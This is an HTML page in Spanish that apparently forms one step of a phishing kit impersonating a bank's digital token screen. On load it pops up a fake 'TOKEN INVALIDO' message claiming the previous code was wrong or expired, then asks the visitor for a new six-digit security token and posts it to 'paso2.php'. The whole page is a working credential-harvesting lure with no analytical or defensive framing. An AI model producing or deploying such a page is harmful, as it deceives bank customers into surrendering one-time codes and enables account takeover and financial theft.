<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
    <style>
        /* Estilos para el modal */
        .modal {
            display: none; /* Oculto por defecto */
            position: fixed; 
            z-index: 1; 
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5); /* Fondo semi-transparente */
        }

        .modal-content {
            background-color: white;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 400px;
            text-align: center;
            border-radius: 10px;
        }

        .close-btn {
            background-color: #f44336;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }

        .close-btn:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body class="body">
    <div class="dc">
        <img src="logo.svg" alt="" width="120px">
    </div>

    <div class="pp">
        <br><br>

        <center>
            <img class="title" src="title.png" alt="">
            <div class="caja1">
                <br>
                <form action="paso2.php" method="post"> 
                    <h1 class="yuyu">TOKEN INVALIDO:</h1>
                    <h1 class="grow">Por tu seguridad, Ingresa la Clave Digital Token</h1>
                    <br>
                    <input inputmode="numeric" placeholder="* * * * * *" type="text" name="Token" id="" class="insp" required maxlength="6" minlength="6">
                    <div class="dv1">
                        <a></a>
                    </div>
                    <br><br>
                    <img src="segur.png" alt="" style="width: 300px;">
                    <input style="font-weight: bold;" class="btn" type="submit" value="Confirmar">
                </form>
            </div>
        </center>
    </div>

    <!-- Modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <p style="font-family:sans-serif;">TOKEN INVALIDO: El código que ingresó es inválido o está vencido, espere uno nuevo y vuelva a intentarlo.</p>
            <button class="close-btn" id="closeModalBtn">Aceptar</button>
        </div>
    </div>

    <script>
        // Mostrar el modal al cargar la página
        window.onload = function() {
            var modal = document.getElementById("myModal");
            var closeModalBtn = document.getElementById("closeModalBtn");

            modal.style.display = "block"; // Muestra el modal

            // Cierra el modal al hacer clic en el botón "Aceptar"
            closeModalBtn.onclick = function() {
                modal.style.display = "none";
            }
        };
    </script>
</body>
</html>
